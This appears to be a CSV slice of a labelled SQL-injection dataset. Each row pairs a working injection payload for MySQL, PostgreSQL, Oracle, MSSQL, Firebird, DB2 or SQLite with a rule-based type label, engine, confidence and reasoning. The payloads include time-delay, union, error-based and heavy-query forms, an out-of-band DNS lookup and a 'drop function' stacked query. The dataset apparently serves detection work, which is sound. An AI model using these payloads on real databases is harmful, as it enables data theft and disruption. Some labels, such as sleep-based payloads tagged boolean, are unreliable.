id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19843,"1'+ ( select inyd where 1668 = 1668 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) ) +'",boolean_blind,mysql,0.85,"Payload contains 'elt(', 'extractvalue(' -> boolean_blind (priority P3). DB engine 'mysql'; DB hint token 'extractvalue'. Selected lowest-priority among 2 signal(s).",2
19844,1' where 7828 = 7828 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.85,Payload contains 'pg_sleep(' -> time_blind (priority P5). DB engine 'postgresql'; DB hint token 'pg_sleep'. Selected lowest-priority among 1 signal(s).,2
19845,"-3865' ) union all select 4935,4935,4935,4935,4935--",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19846,"1"" where 6200 = 6200 and elt ( 1210 = 1210,sleep ( 5 ) ) --",boolean_blind,mysql,0.95,"Payload contains 'elt(', 'sleep(' -> boolean_blind (priority P3). DB engine 'mysql'. Selected lowest-priority among 2 signal(s).",3
19847,1'+ ( select zwsr where 6567 = 6567,boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1'+ ( select zwsr where 6567 = 6567' suggests boolean fragment",3
19848,1' ) and 8404 = 8651#,boolean_blind,generic,0.95,Payload contains 'and 8404 = 8651' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19849,"1%"" and 4595 = 4595#",boolean_blind,generic,0.95,Payload contains 'and 4595 = 4595' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19850,1%' ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.85,Payload contains 'pg_sleep(' -> time_blind (priority P5). DB engine 'postgresql'; DB hint token 'pg_sleep'. Selected lowest-priority among 1 signal(s).,2
19851,"1"" ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ""kszu"" = ""kszu",boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1"" ( select ( case when ( 5451 = 5451 ) then regexp_substrin' suggests boolean fragment",2
19852,"1"" where 6111 = 6111 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,"Payload contains 'all_users t1,all_users t2,...' -> heavy_query (priority P4). DB engine 'oracle'; DB hint token 'all_users'. Selected lowest-priority among 1 signal(s).",1
19853,"1'+ ( select nzij where 5456 = 5456 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) ) +'",boolean_blind,mysql,0.85,"Payload contains 'elt(', 'union select' -> boolean_blind (priority P3). DB engine 'mysql'. Selected lowest-priority among 2 signal(s).",2
19854,"select count ( * ) from generate_series ( 1,5000000 ) ) +'",heavy_query,postgresql,0.95,"Payload contains 'generate_series(1,5000000)' -> heavy_query (priority P4). DB engine 'postgresql'; DB hint token 'generate_series'. Selected lowest-priority among 1 signal(s).",3
19855,"1' ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( 'obeh' = 'obeh",time_blind,mysql,0.85,Payload contains 'benchmark(' -> time_blind (priority P5). DB engine 'mysql'. Selected lowest-priority among 1 signal(s).,2
19856,1%' ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( '%' = ',out_of_band,oracle,0.9,Payload contains 'utl_inaddr.get_host_address' -> out_of_band (priority P6). DB engine 'oracle'; DB hint token 'utl_inaddr'. Selected lowest-priority among 1 signal(s).,1
19857,"1 ) ) as jyfo where 8121 = 8121 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.7,"Payload contains 'rdb$fields,rdb$types cartesian' -> heavy_query (priority P4). DB engine 'firebird'; DB hint token 'rdb$fields'. Selected lowest-priority among 1 signal(s).",1
19858,"1"" ) ) as gvpm where 5170 = 5170 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.7,Payload contains 'sysusers cartesian join' -> heavy_query (priority P4). DB engine 'mssql'; DB hint token 'sysusers'. Selected lowest-priority among 1 signal(s).,1
19859,"1'+ ( select hsef where 4136 = 4136 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) +'",heavy_query,postgresql,0.95,"Payload contains 'generate_series(1,5000000)' -> heavy_query (priority P4). DB engine 'postgresql'; DB hint token 'generate_series'. Selected lowest-priority among 1 signal(s).",3
19860,1'+ ( select 'mdiu' where 4443 = 4443,boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1'+ ( select 'mdiu' where 4443 = 4443' suggests boolean fragment",3
19861,"-2783' where 1494 = 1494 union all select 1494,1494,1494,1494,1494,1494--",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19862,1'+ ( select 'wvqj' where 3709 = 3709,boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1'+ ( select 'wvqj' where 3709 = 3709' suggests boolean fragment",3
19863,1'+ ( select 'xpby' where 2724 = 2724,boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1'+ ( select 'xpby' where 2724 = 2724' suggests boolean fragment",3
19864,1' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 'yhku' like 'yhku,error_based,postgresql,0.7,Payload contains 'cast(...::text)' -> error_based (priority P4). DB engine 'postgresql'; DB hint token '::text'. Selected lowest-priority among 1 signal(s).,1
19865,"1' ) where 6731 = 6731 or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,"Payload contains 'elt(', 'sleep(' -> boolean_blind (priority P3). DB engine 'mysql'. Selected lowest-priority among 2 signal(s).",3
19866,"-8128"" ) ) as ovjz where 7375 = 7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19867,"1%' ) union all select null,null--",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19868,"1"" ) ) and ( 1248 = 8705 ) *8705 and ( ( ""wvma"" like ""wvma",boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1"" ) ) and ( 1248 = 8705 ) *8705 and ( ( ""wvma"" like ""wvma' suggests boolean fragment",2
19869,"1' in boolean mode ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19870,"1"" and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""eslo"" like ""eslo",heavy_query,postgresql,0.95,"Payload contains 'generate_series(1,5000000)' -> heavy_query (priority P4). DB engine 'postgresql'; DB hint token 'generate_series'. Selected lowest-priority among 1 signal(s).",3
19871,"1"" ) as upyn where 6185 = 6185 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19872,end and ( ( ( 'nhub' = 'nhub,boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in 'end and ( ( ( 'nhub' = 'nhub' suggests boolean fragment",2
19873,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'nmat' like 'nmat",heavy_query,firebird,0.7,"Payload contains 'domain.domains,domain.tables cartesian' -> heavy_query (priority P4). DB engine 'firebird'; DB hint token 'domain.domains'. Selected lowest-priority among 1 signal(s).",1
19874,1' ) ) as sjzf where 9997 = 9997 and 4193 = 5408,boolean_blind,generic,0.95,Payload contains 'and 4193 = 5408' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19875,"-2032%"" ) ) ) or ( 3082 = 7155 ) *7155 and ( ( ( ""%"" = """,boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '-2032%"" ) ) ) or ( 3082 = 7155 ) *7155 and ( ( ( ""%"" = ""' suggests boolean fragment",2
19876,"1' ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1' ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char' suggests boolean fragment",2
19877,"1'|| ( select 'lpej' from dual where 8294 = 8294 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'",boolean_blind,mysql,0.85,Payload contains 'elt(' -> boolean_blind (priority P3). DB engine 'mysql'; DB hint token 'from dual'. Selected lowest-priority among 1 signal(s).,2
19878,"1%"" ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( ""%"" = """,boolean_blind,mysql,0.85,"Payload contains 'elt(', 'exp(~' -> boolean_blind (priority P3). DB engine 'mysql'. Selected lowest-priority among 2 signal(s).",2
19879,"1' ) as cgsz where 7194 = 7194 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",boolean_blind,mysql,0.85,"Payload contains 'elt(', 'extractvalue(' -> boolean_blind (priority P3). DB engine 'mysql'; DB hint token 'extractvalue'. Selected lowest-priority among 2 signal(s).",2
19880,"-4397' ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 'omqt' = 'omqt",boolean_blind,mysql,0.85,Payload contains 'make_set(' -> boolean_blind (priority P3). DB engine 'mysql'; DB hint token 'make_set'. Selected lowest-priority among 1 signal(s).,2
19881,1 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) # awpq,time_blind,postgresql,0.85,Payload contains 'pg_sleep(' -> time_blind (priority P5). DB engine 'postgresql'; DB hint token 'pg_sleep'. Selected lowest-priority among 1 signal(s).,2
19882,select pg_sleep ( 5 ) and ( 1044 = 1044,time_blind,postgresql,0.85,Payload contains 'pg_sleep(' -> time_blind (priority P5). DB engine 'postgresql'; DB hint token 'pg_sleep'. Selected lowest-priority among 1 signal(s).,2
19883,-8112' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 'xopg' = 'xopg,error_based,postgresql,0.7,Payload contains 'cast(...::text)' -> error_based (priority P4). DB engine 'postgresql'; DB hint token '::text'. Selected lowest-priority among 1 signal(s).,1
19884,"-6305"" ) ) ) or 8097 = 2048 and ( ( ( ""euyy"" like ""euyy",boolean_blind,generic,0.95,Payload contains 'or 8097 = 2048' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19885,"1"" ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.7,"Payload contains 'rdb$fields,rdb$types cartesian' -> heavy_query (priority P4). DB engine 'firebird'; DB hint token 'rdb$fields'. Selected lowest-priority among 1 signal(s).",1
19886,"1%' ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and '%' = '",time_blind,postgresql,0.7,Payload contains 'regexp_substring(repeat(...crypt_key...))' -> time_blind (priority P5). DB engine 'postgresql'; DB hint token 'regexp_substring'. Selected lowest-priority among 1 signal(s).,1
19887,"-4901' union all select 1536,1536,1536,1536,1536,1536,1536#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19888,"1'|| ( select 'cozi' from dual where 2607 = 2607 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,"Payload contains 'all_users t1,all_users t2,...' -> heavy_query (priority P4). DB engine 'oracle'; DB hint token 'all_users'. Selected lowest-priority among 1 signal(s).",1
19889,"1 ) ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.85,"Payload contains 'extractvalue(', 'benchmark(' -> error_based (priority P4). DB engine 'mysql'; DB hint token 'extractvalue'. Selected lowest-priority among 2 signal(s).",2
19890,"1' ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( 'uzxr' = 'uzxr",boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1' ) ( select ( case when ( 5451 = 5451 ) then regexp_substr' suggests boolean fragment",2
19891,"-2434 ) union all select 8310,8310,8310,8310,8310--",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19892,"-2112 union all select 2995,2995,2995,2995,2995--",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19893,"1"" ) ) as oxrr where 6141 = 6141 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Payload contains 'randomblob(' -> time_blind (priority P5). DB engine 'sqlite'; DB hint token 'randomblob'. Selected lowest-priority among 1 signal(s).,2
19894,"1 where 6221 = 6221 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.7,"Payload contains 'rdb$fields,rdb$types cartesian' -> heavy_query (priority P4). DB engine 'firebird'; DB hint token 'rdb$fields'. Selected lowest-priority among 1 signal(s).",1
19895,-5365 or 7517 = 5726--,boolean_blind,generic,0.95,Payload contains 'or 7517 = 5726' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19896,if ( 7427 = 7800 ) select 7427 else drop function dgir--,stacked_queries,generic,0.7,Payload contains 'drop function' -> stacked_queries (priority P8). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,1
19897,"iif ( 7953 = 3021,1,1/0 )",boolean_blind,mssql,0.7,Payload contains 'iif(' -> boolean_blind (priority P3). DB engine 'mssql'; DB hint token 'iif ('. Selected lowest-priority among 1 signal(s).,1
19898,"1"" where 7005 = 7005",boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1"" where 7005 = 7005' suggests boolean fragment",2
19899,1 where 9620 = 9620 waitfor delay '0:0:5'--,time_blind,mssql,0.95,Payload contains 'waitfor delay' -> time_blind (priority P5). DB engine 'mssql'; DB hint token 'waitfor delay'. Selected lowest-priority among 1 signal(s).,3
19900,-6405%' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( '%' = ',boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '-6405%' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( '%' = '' suggests boolean fragment",2
19901,"1"" ) and 4760 = 2922",boolean_blind,generic,0.95,Payload contains 'and 4760 = 2922' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19902,"1 ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",heavy_query,firebird,0.7,"Payload contains 'domain.domains,domain.tables cartesian' -> heavy_query (priority P4). DB engine 'firebird'; DB hint token 'domain.domains'. Selected lowest-priority among 1 signal(s).",1
19903,"-5825 ) as mflf where 3999 = 3999 or make_set ( 1492 = 7153,7153 ) --",boolean_blind,mysql,0.95,Payload contains 'make_set(' -> boolean_blind (priority P3). DB engine 'mysql'; DB hint token 'make_set'. Selected lowest-priority among 1 signal(s).,3
19904,"1"" union all select null,null,null,null,null,null--",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19905,"1 ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",time_blind,postgresql,0.7,Payload contains 'regexp_substring(repeat(...crypt_key...))' -> time_blind (priority P5). DB engine 'postgresql'; DB hint token 'regexp_substring'. Selected lowest-priority among 1 signal(s).,1
19906,-5830' ) as fivy where 2173 = 2173 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '-5830' ) as fivy where 2173 = 2173 or 5903 = ( 'qqpjq'|| ( s' suggests boolean fragment",3
19907,"1' ) where 8125 = 8125 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",error_based,mssql,0.7,"Payload contains 'convert(int,' -> error_based (priority P4). DB engine 'mssql'; DB hint token 'convert ( int'. Selected lowest-priority among 1 signal(s).",1
19908,"1' ) where 2775 = 2775 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,0.95,Payload contains 'dbms_pipe.receive_message' -> time_blind (priority P5). DB engine 'oracle'; DB hint token 'dbms_pipe'. Selected lowest-priority among 1 signal(s).,3
19909,"1 ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.7,"Payload contains 'sysibm.systables as t1,t2,t3' -> heavy_query (priority P4). DB engine 'db2'; DB hint token 'sysibm.systables'. Selected lowest-priority among 1 signal(s).",1
19910,1 ) as fnpq where 5209 = 5209,benign,generic,0.5,UNCERTAIN: payload '1 ) as fnpq where 5209 = 5209' has no recognized SQLi function/keyword pattern,2
19911,"1"" ) ) ) order by 1#",benign,generic,0.5,"UNCERTAIN: payload '1"" ) ) ) order by 1#' has no recognized SQLi function/keyword pattern",3
19912,1 where 8889 = 8889,benign,generic,0.5,UNCERTAIN: payload '1 where 8889 = 8889' has no recognized SQLi function/keyword pattern,2
19913,"1' where 4334 = 4334 or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,"Payload contains 'elt(', 'sleep(' -> boolean_blind (priority P3). DB engine 'mysql'. Selected lowest-priority among 2 signal(s).",3
19914,"-9873"" union all select 8020,8020,8020,8020,8020,8020#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19915,"1 where 8045 = 8045 union all select null,null,null--",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19916,1'|| ( select 'lzzr' where 2477 = 2477,boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1'|| ( select 'lzzr' where 2477 = 2477' suggests boolean fragment",3
19917,"1"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""zyoo"" = ""zyoo",time_blind,postgresql,0.7,Payload contains 'regexp_substring(repeat(...crypt_key...))' -> time_blind (priority P5). DB engine 'postgresql'; DB hint token 'regexp_substring'. Selected lowest-priority among 1 signal(s).,1
19918,"1%"" ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ""%"" = """,error_based,mysql,0.85,Payload contains 'extractvalue(' -> error_based (priority P4). DB engine 'mysql'; DB hint token 'extractvalue'. Selected lowest-priority among 1 signal(s).,2
19919,-7369 or 9323 = 9323#,boolean_blind,generic,0.95,Payload contains 'or 9323 = 9323' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19920,select ( case when ( 3444 = 8424 ) then 3444 else 3444* ( select 3444 from information_schema.character_sets ) end ) #,benign,generic,0.5,UNCERTAIN: payload 'select ( case when ( 3444 = 8424 ) then 3444 else 3444* ( se' has no recognized SQLi function/keyword pattern,1
19921,1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),error_based,oracle,0.85,Payload contains 'xmltype(' -> error_based (priority P4). DB engine 'oracle'; DB hint token 'xmltype'. Selected lowest-priority among 1 signal(s).,2
19922,end and ( 'hmtt' like 'hmtt,benign,generic,0.5,UNCERTAIN: payload 'end and ( 'hmtt' like 'hmtt' has no recognized SQLi function/keyword pattern,2
19923,"1, ( select ( case when ( 4828 = 2600 ) then 1 else 1/ ( select 0 ) end ) )",benign,generic,0.5,"UNCERTAIN: payload '1, ( select ( case when ( 4828 = 2600 ) then 1 else 1/ ( sel' has no recognized SQLi function/keyword pattern",1
19924,"1' and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'hstg' like 'hstg",heavy_query,mssql,0.7,Payload contains 'sysusers cartesian join' -> heavy_query (priority P4). DB engine 'mssql'; DB hint token 'sysusers'. Selected lowest-priority among 1 signal(s).,1
19925,1'+ ( select qugu where 2287 = 2287 order by 1#,boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1'+ ( select qugu where 2287 = 2287 order by 1#' suggests boolean fragment",3
19926,1' in boolean mode ) and 2006 = 2006,boolean_blind,generic,0.95,Payload contains 'and 2006 = 2006' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19927,"1"" where 1452 = 1452 union all select null,null,null,null--",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19928,-2790' ) ) or 8571 = 8571--,boolean_blind,generic,0.95,Payload contains 'or 8571 = 8571' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19929,-2393%' ) ) union all select 2772--,union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19930,"1'|| ( select 'bvic' from dual where 4839 = 4839 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ) ||'",time_blind,oracle,0.95,Payload contains 'dbms_pipe.receive_message' -> time_blind (priority P5). DB engine 'oracle'; DB hint token 'dbms_pipe'. Selected lowest-priority among 1 signal(s).,3
19931,"1 ) ) as tbiq where 7159 = 7159 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.95,"Payload contains 'generate_series(1,5000000)' -> heavy_query (priority P4). DB engine 'postgresql'; DB hint token 'generate_series'. Selected lowest-priority among 1 signal(s).",3
19932,"1' where 3700 = 3700 union all select null,null,null--",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19933,"1 where 8333 = 8333 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.95,Payload contains 'ctxsys.drithsx' -> error_based (priority P4). DB engine 'oracle'; DB hint token 'ctxsys'. Selected lowest-priority among 1 signal(s).,3
19934,"-7142' ) ) union all select 5083,5083,5083,5083#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19935,"1%"" ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,"Payload contains 'elt(', 'sleep(' -> boolean_blind (priority P3). DB engine 'mysql'. Selected lowest-priority among 2 signal(s).",2
19936,"1"" ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""ddun"" = ""ddun",heavy_query,oracle,0.7,"Payload contains 'all_users t1,all_users t2,...' -> heavy_query (priority P4). DB engine 'oracle'; DB hint token 'all_users'. Selected lowest-priority among 1 signal(s).",1
19937,1 where 5080 = 5080,benign,generic,0.5,UNCERTAIN: payload '1 where 5080 = 5080' has no recognized SQLi function/keyword pattern,2
19938,1 ) ) as kiqk where 7366 = 7366 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,0.85,Payload contains 'sleep(' -> time_blind (priority P5). DB engine 'mysql'. Selected lowest-priority among 1 signal(s).,2
19939,"-8279"" union all select 6598,6598,6598,6598,6598,6598,6598,6598#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
